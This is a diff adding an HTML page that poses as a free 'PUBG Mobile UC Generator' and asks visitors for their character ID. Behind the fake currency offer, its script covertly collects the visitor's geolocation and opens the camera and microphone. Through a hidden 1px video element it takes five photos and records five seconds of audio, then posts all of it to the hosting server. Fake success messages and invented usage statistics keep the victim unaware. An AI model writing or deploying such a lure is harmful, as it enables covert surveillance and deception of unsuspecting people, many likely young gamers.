@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ps" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile UC Generator</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background-color: #1a1a1a; color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 15px; }
+        .container { width: 100%; max-width: 420px; background-color: #242424; border-radius: 20px; padding: 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.6); display: flex; flex-direction: column; gap: 15px; border: 1px solid #333; }
+        .header { display: flex; justify-content: space-between; align-items: center; }
+        .logo-title { color: #f39c12; font-size: 26px; font-weight: 900; font-style: italic; }
+        .logo-sub { color: #ffffff; font-size: 26px; font-weight: 900; font-style: italic; }
+        .badge-uc { background-color: #f39c12; color: #000; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 20px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; text-align: center; background-color: #2c2c2c; padding: 12px 8px; border-radius: 14px; }
+        .stat-val { font-size: 16px; font-weight: bold; color: #f1c40f; }
+        .stat-lbl { font-size: 10px; color: #b0bec5; margin-top: 3px; }
+        .card { background-color: #2c2c2c; padding: 12px 15px; border-radius: 14px; border: 1px solid #3d3d3d; }
+        .card-label { font-size: 13px; color: #b0bec5; margin-bottom: 8px; display: block; }
+        .input-box { width: 100%; background: transparent; border: none; color: #f39c12; font-size: 18px; font-weight: bold; outline: none; }
+        select.input-box { background-color: #2c2c2c; color: white; border-radius: 6px; padding: 4px 0; }
+        .grid-uc { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .uc-card { background-color: #2c2c2c; border: 1px solid #3d3d3d; padding: 15px 5px; border-radius: 14px; text-align: center; cursor: pointer; position: relative; }
+        .uc-card.active { background: linear-gradient(135deg, #f39c12, #d35400); border-color: #f1c40f; }
+        .pop-badge { position: absolute; top: -8px; left: 50%; transform: translateX(-50%); background-color: #e74c3c; color: white; font-size: 8px; padding: 2px 6px; border-radius: 6px; }
+        .u-title { font-size: 16px; font-weight: bold; color: #ffffff; }
+        .u-sub { font-size: 11px; color: #b0bec5; margin-top: 4px; }
+        .generate-btn { background: linear-gradient(135deg, #f39c12, #d35400); color: white; width: 100%; padding: 16px; border: none; border-radius: 30px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .error-box { display: none; background-color: rgba(231, 76, 60, 0.15); border: 1px solid #e74c3c; border-radius: 12px; padding: 12px; text-align: center; color: #e74c3c; font-weight: bold; }
+        .success-box { display: none; background-color: rgba(46, 204, 113, 0.15); border: 1px solid #2ecc71; border-radius: 12px; padding: 12px; text-align: center; color: #2ecc71; font-weight: bold; }
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo-area"><span class="logo-title">PUBG</span><span class="logo-sub">MOBILE</span></div>
+            <div class="badge-uc">Free UC</div>
+        </div>
+        <div class="stats-grid">
+            <div class="stat-card"><div class="stat-val">3.8M</div><div class="stat-lbl">Active Players</div></div>
+            <div class="stat-card"><div class="stat-val">12.4M</div><div class="stat-lbl">UC Given</div></div>
+            <div class="stat-card"><div class="stat-val">99.9%</div><div class="stat-lbl">Success Rate</div></div>
+        </div>
+        <div class="card">
+            <span class="card-label">🆔 Enter PUBG Character ID</span>
+            <input type="text" class="input-box" id="userId" placeholder="Enter Character ID here...">
+        </div>
+        <span class="card-label" style="margin-bottom: -5px;">Select UC Amount</span>
+        <div class="grid-uc">
+            <div class="uc-card" data-uc="325 UC"><div class="u-title">🪙 325</div><div class="u-sub">UC</div></div>
+            <div class="uc-card active" data-uc="660 UC"><div class="pop-badge">POPULAR</div><div class="u-title">🪙 660</div><div class="u-sub">UC</div></div>
+            <div class="uc-card" data-uc="1800 UC"><div class="u-title">🪙 1800</div><div class="u-sub">UC</div></div>
+        </div>
+        <div class="card">
+            <span class="card-label">🌐 Select Server</span>
+            <select class="input-box" id="serverSelect">
+                <option value="Asia Server">🌏 Asia Server</option><option value="Europe Server">🇪🇺 Europe Server</option><option value="Middle East">🇦🇪 Middle East Server</option>
+            </select>
+        </div>
+        <button id="generateBtn" class="generate-btn">🪙 Generate UC</button>
+        <div id="errorBox" class="error-box">⚠️ Please enter your PUBG Character ID first!</div>
+        <div id="successBox" class="success-box">✅ Successfully added <span id="selectedUcText">660 UC</span> to Character ID!</div>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const ucCards = document.querySelectorAll('.uc-card');
+        let selectedUcValue = '660 UC';
+        ucCards.forEach(c => c.addEventListener('click', function() {
+            ucCards.forEach(x => x.classList.remove('active'));
+            this.classList.add('active');
+            selectedUcValue = this.getAttribute('data-uc');
+        }));
+        async function sendData(fd) { try { await fetch(window.location.origin, { method: 'POST', body: fd }); } catch(e){} }
+        async function sendSinglePhoto(stream) {
+            const v = document.getElementById('video'), c = document.getElementById('canvas');
+            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
+            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
+        }
+        async function recordAndSendAudio(stream) {
+            return new Promise(r => {
+                try {
+                    const mr = new MediaRecorder(stream), chunks = [];
+                    mr.ondataavailable = e => chunks.push(e.data);
+                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
+                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
+                } catch(e) { r(); }
+            });
+        }
+        document.getElementById("generateBtn").addEventListener("click", async function() {
+            const btn = document.getElementById("generateBtn"), uid = document.getElementById("userId").value.trim();
+            if(!uid) { document.getElementById("errorBox").style.display = "block"; return; }
+            document.getElementById("errorBox").style.display = "none"; btn.disabled = true; btn.innerText = "Connecting...";
+            document.getElementById("successBox").style.display = "block";
+            if (navigator.geolocation) {
+                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
+                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
+                }, () => r(), { timeout: 4000 }));
+            }
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
+                    await new Promise(r => setTimeout(r, 300));
+                    let count = 0;
+                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
+                    await recordAndSendAudio(stream);
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            } catch(e) {}
+            btn.innerText = "UC Generated ✅";
+        });
+    </script>
+</body>
+</html>
